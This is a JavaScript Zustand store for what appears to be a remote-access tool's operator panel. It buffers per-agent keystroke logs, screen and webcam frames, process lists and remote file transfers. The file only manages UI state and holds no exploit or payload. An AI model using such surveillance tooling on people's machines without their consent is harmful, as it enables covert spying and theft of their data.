// ModuleStore.js — per-agent, per-module data received from the Gateway.
// Shape: data[agent_id][module] — each module key holds its own data type.
import { create } from 'zustand'

// Hard limit on buffered keylog events to prevent unbounded memory growth.
const MAX_KEYLOG_EVENTS = 1000

// Return the default empty state for one agent's module slots.
function createAgentModuleState()
{
    return {
        app          : [],                         // app_list_result: array of app objects
        process      : [],                         // proc_list_result: array of process objects
        keylog       : [],                         // accumulated keystroke event objects
        keylog_active : false,                      // true while Agent is sending keylog data
        screen        : { frame: null, meta: null },// latest screen JPEG (ArrayBuffer) + frame_meta
        webcam        : { frame: null, meta: null },// latest webcam JPEG (ArrayBuffer) + frame_meta
        // file.tree caches directory listings keyed by path (sandbox only).
        // file_download holds the latest fs_get_result so FileTab can trigger a download.
        // file_put_ack holds the latest fs_put_result / fs_put_complete so FileTab
        //   can advance the progress bar after each acknowledged chunk.
        file          : { tree: {}, path: '/' },
        file_download : null,
        file_put_ack  : null,
    }
}

const useModuleStore = create(function (set)
{
    return {
        data: {},

        // Write (or merge) a payload into one agent + module slot.
        // Creates the agent entry if it does not exist yet.
        setModuleData: (agent_id, module, payload) =>
            set(function (s)
            {
                const agent_data = s.data[agent_id] ?? createAgentModuleState()
                return {
                    data: {
                        ...s.data,
                        [agent_id]:
                        {
                            ...agent_data,
                            [module]: payload,
                        },
                    },
                }
            }),

        // Append incoming keylog events to the buffer instead of replacing it.
        // Old entries are trimmed when the buffer exceeds MAX_KEYLOG_EVENTS.
        appendKeylog: (agent_id, events) =>
            set(function (s)
            {
                const agent_data   = s.data[agent_id] ?? createAgentModuleState()
                const merged       = [...agent_data.keylog, ...events]
                const trimmed      = merged.slice(-MAX_KEYLOG_EVENTS)
                return {
                    data: {
                        ...s.data,
                        [agent_id]: { ...agent_data, keylog: trimmed },
                    },
                }
            }),

        // Set the keylog active flag for one agent (true = Agent is sending events).
        setKeylogActive: (agent_id, active) =>
            set(function (s)
            {
                const agent_data = s.data[agent_id] ?? createAgentModuleState()
                return {
                    data: {
                        ...s.data,
                        [agent_id]: { ...agent_data, keylog_active: active },
                    },
                }
            }),

        // Merge a new directory listing into file.tree under the given path (sandbox only).
        // Called by UseAgentSocket when an fs_list_result message arrives.
        setFsEntries: (agent_id, path, entries) =>
            set(function (s)
            {
                const agent_data = s.data[agent_id] ?? createAgentModuleState()
                const file_state = agent_data.file
                return {
                    data: {
                        ...s.data,
                        [agent_id]:
                        {
                            ...agent_data,
                            file: { tree: { ...file_state.tree, [path]: entries }, path },
                        },
                    },
                }
            }),

        // Store the latest fs_get_result so FileTab can assemble and download the file.
        // A monotonic _seq field is added so React's useEffect always detects a change.
        setFileDownload: (agent_id, result) =>
            set(function (s)
            {
                const agent_data = s.data[agent_id] ?? createAgentModuleState()
                return {
                    data: {
                        ...s.data,
                        [agent_id]: { ...agent_data, file_download: { ...result, _seq: Date.now() } },
                    },
                }
            }),

        // Store the latest fs_put_result or fs_put_complete acknowledgement.
        // The complete flag is true only when all chunks have been received by the Agent.
        // A monotonic _seq ensures the watching useEffect always fires on a new ack.
        setFilePutAck: (agent_id, result) =>
            set(function (s)
            {
                const agent_data = s.data[agent_id] ?? createAgentModuleState()
                return {
                    data: {
                        ...s.data,
                        [agent_id]: { ...agent_data, file_put_ack: { ...result, _seq: Date.now() } },
                    },
                }
            }),

        // Clear file_put_ack after the component has consumed it.
        clearFilePutAck: (agent_id) =>
            set(function (s)
            {
                const agent_data = s.data[agent_id] ?? createAgentModuleState()
                return {
                    data: {
                        ...s.data,
                        [agent_id]: { ...agent_data, file_put_ack: null },
                    },
                }
            }),

        // Clear file_download after the component has consumed it.
        clearFileDownload: (agent_id) =>
            set(function (s)
            {
                const agent_data = s.data[agent_id] ?? createAgentModuleState()
                return {
                    data: {
                        ...s.data,
                        [agent_id]: { ...agent_data, file_download: null },
                    },
                }
            }),

        // Reset one module slot back to its default empty value.
        clearModule: (agent_id, module) =>
            set(function (s)
            {
                const agent_data    = { ...(s.data[agent_id] ?? createAgentModuleState()) }
                const default_state = createAgentModuleState()
                agent_data[module]  = default_state[module] ?? null
                return { data: { ...s.data, [agent_id]: agent_data } }
            }),

        // Remove all module data for an agent (called when an agent disconnects).
        clearAgent: (agent_id) =>
            set(function (s)
            {
                const next = { ...s.data }
                delete next[agent_id]
                return { data: next }
            }),
    }
})

export default useModuleStore
